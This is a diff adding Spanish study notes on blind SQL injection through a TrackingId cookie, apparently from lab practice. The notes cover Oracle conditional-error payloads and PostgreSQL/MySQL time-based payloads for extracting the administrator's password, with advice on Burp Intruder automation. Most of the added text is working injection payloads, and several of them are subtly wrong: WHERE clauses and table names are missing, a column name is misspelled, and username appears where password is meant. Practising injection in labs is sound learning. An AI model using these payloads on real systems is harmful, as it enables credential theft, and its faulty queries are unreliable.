@@ -242,3 +242,115 @@ Cookie: TrackingId=R6IxX1tiUucyn6LL' and (select 'a' from users where username='
 --* Y solo habria que recorrer esta length recorriendo a su vez por cada posición cada una de las posibilidades de caracteres
 --* que podrían ser y simplemente leer la respuesta para ver si existe el string "Welcome back!" en la misma en el text.
 
+--! Conditional Errors 
+-- Oracle
+-- En oracle para comprobar por una injeccion si la misma existe se debe limitar el rownum a 1
+--* En este caso tratamos con una SQLI la cual se encuentra generando errores a la hora de romper, podemos ir intentando descubrir
+--* ante que nos enfrentamos con injecciones de la sig manera
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv'  
+--* Internal server error 
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv' and 1=1-- -
+--* Nada
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv' and '1'='1
+--* Nada
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv' and '2'='1
+--* Nada
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv' and (select 'a')='a
+--* Internal server error
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv' and (select 'b')='a
+--* Internal server error
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv''
+--* Nada
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv'||(select '')||'
+--* Internal server error
+
+--* Aca es donde podemos empezar a pensar.....oracle?
+
+--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv'||(select '' from dual)||'
+--* Nada
+
+--* De esta manera acabamos de darnos cuentas de que estamos tratamdo con oracle 
+
+--? CookieTrackingId=q3XzfKFtNBf4dtNv'||(select '' from users rownum=1)||'
+--* Nada
+
+--?   CookieTrackingId=q3XzfKFtNBf4dtNv'||(select case when (1=1) then to_char(1/0) else '' end from users  
+--?   where uername='adasdr'  )||'
+--* Rompe.....Porque? Que es esta query?
+
+--* Primero que nada la query se lee de derecha a izquierda, por lo que primero lo que hace la misma es buscar de la tabla users
+--* el username 'adasdr', en caso de encontrarlo, se va a al 'case when (1=1)' el cual no se cumple ya que no se encontro
+--* al usuario, por lo tanto lo que hace es '', es decir nada, y el server devuelve un 200 OK. Ahora... si nosotros hicieramos la
+--* siguiente query usando la misma de arriba pero para intentar fuzear datos?:
+
+--?   CookieTrackingId=q3XzfKFtNBf4dtNv'|| (select case when (1=1) then to_char(1/0) else '' end from users where
+--?   username='administrator')||'
+
+--* De esta manera lo que sucede es que se va a buscar de la tabla users al usuario 'administrator' el cual existe, el caso se 
+--* convierte en true, por lo que 1=1 y entra al then, el cual intenta realizar una operatoria la cual arrojara error, de este 
+--* modo si la página arroja error sabremos que en realidad es un 200 OK para nosotros.
+
+--* Entonces como intentamos conseguir la contraseña?
+
+--?  CookieTrackingId=q3XzfKFtNBf4dtNv'|| (select case when (1=1) then to_char(1/0) else '' end from users where 
+--?  username='administrator' and length(password)>=20) ||'
+
+
+--* De esta manera lo que stamos haciendo es decir que si en la tabla users existe el usuario administrador, por lo tanto en 
+--* el caso de que en la tabla username, el primer caracter, en la primera row sea 'a' va a intentar realizar la operación que 
+--* rompe y sevuelve 500 siempre que lo que estemos intentando saber sea true, y 200 OK en el caso de que sea false, usando esto
+--* podemos intentar fuzear la contraseña
+--?  CookieTrackingId=q3XzfKFtNBf4dtNv'|| (select case when substr(username,1,1)='a' then to_char(1/0) else '' end from 
+--?  username='administrator') ||'
+
+--* Lo mismo pero para la contraseña, vamos a tener que hacer un script el cual itere sobre la posición del caracter y los 
+--* caracteres, al igual que en la blind sqli de Conditional response, es hacer lo mismo pero vazandonos en errores y en este
+--* caso en oracle.
+--?  CookieTrackingId=q3XzfKFtNBf4dtNv'|| (select case when substr(username,1,1)='a' then to_char(1/0) else '' end from 
+--?  username='administrator') ||'
+
+--* En el intruder de burpsuite se puede realizar esto con los payloads de los caracteres a-z y nums 0-9, icluso ir a opciones 
+--* es bajar a Grep - Extract y crear una regex, seleccionando (en este caso) el codigo de estado, le damos a ok y creamos una 
+--* regex.
+
+--* Tambien podriamos hacer un Cluster bomb, seleccionando como payload positions el número en donde indicamos la posición del
+--* del character en la tabla que estamos usando substr(password,----> 1 <-----,1) y el character con el cual se lo iguala 
+--* substr(password,x,1)='---> a <---'.
+--* Primer payload del 0-9, segundo
+
+--! Basadas en tiempo
+-- PostgresSQL
+--* Se trata de manipular el tiempo de respuesta de la web luego de tratar de injectar multiples injecciones
+--* Por ejemplo en mysql la idea seria algo asi: 
+--* Si la primera letra de la primera db (en este caso) empieza con 'a', sleep(5), si no, 1
+--? CookieTrackingId=q3XzfKFtNBf4dtNv' and if(substr(database(),1,1)='a', sleep(5),1)-- -'
+
+--* Pero en postgres?
+
+--? CookieTrackingId=q3XzfKFtNBf4dtNv'||pg_sleep(10)-- -
+--? CookieTrackingId=q3XzfKFtNBf4dtNv' and sleep(10)-- -
+-- MySQL
+
+--* En burpsuite, ataque de tipo sniper, pero creamos un nuevo Resource Pool , Maximum concurrent requests 1, Delay 500:
+
+
+--* La idea es la misma, una vez detectado tengo una manera de poder saber si los datos que quiero fuzear son correctos.
+
+--? CookieTrackingId=q3XzfKFtNBf4dtNv'||(select '' from users where username='administrator')-- -
+
+--* Si de la tabla users existe el usuario administrator, 1=1 entonces hace que la respuesta tarde 10s, de lo contrario 0s
+--?  CookieTrackingId=q3XzfKFtNBf4dtNv'||(select case when (1=1) then pg_sleep(10) else pg_sleep(0) end from users where 
+--?  username='administrator')
+
+--* La misma idea, si se cumple tarda, si no, no xd
+--? CookieTrackingId=q3XzfKFtNBf4dtNv'|| (select case when substring(username,1,1)='a' then pg_sleep(10) else pg_sleep(0) end
+--? from users where username='administrator')
+
